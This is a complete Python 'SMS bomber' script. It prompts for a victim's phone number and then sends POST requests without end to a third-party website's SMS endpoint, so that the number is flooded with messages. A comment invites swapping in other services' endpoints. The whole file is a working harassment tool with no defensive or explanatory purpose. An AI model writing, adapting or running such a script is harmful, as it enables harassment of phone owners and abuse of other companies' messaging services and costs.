import requests
from colorama import Fore
import os
import socket

os.system("clear")
print(Fore.RED + """
███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                   """)

url = "https://stc.ninisite.com/s/av/"    #you can paste your own APU url here.
number = input(Fore.GREEN+ "Enter your number ?")


def check_network():
     try:
          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          s.connect(("8.8.8.8", 80))
          ip = s.getsockname()[0]
          return ip
     except Exception:
          return None

ip = check_network()

if not ip:
     print(Fore.YELLOW + "⚠️You are not connected to internet!")

while True:
    try:
        response = requests.post(url, data={"cellphone": number})
        if response.status_code == 200:
            print(Fore.BLUE + "✅Message sent successfull.")
        else:
            print(Fore.RED + f"❌Failed to send message! Status code: {response.status_code}")
    except Exception as e:
            print(Fore.RED + f"Error occurred: {e}")
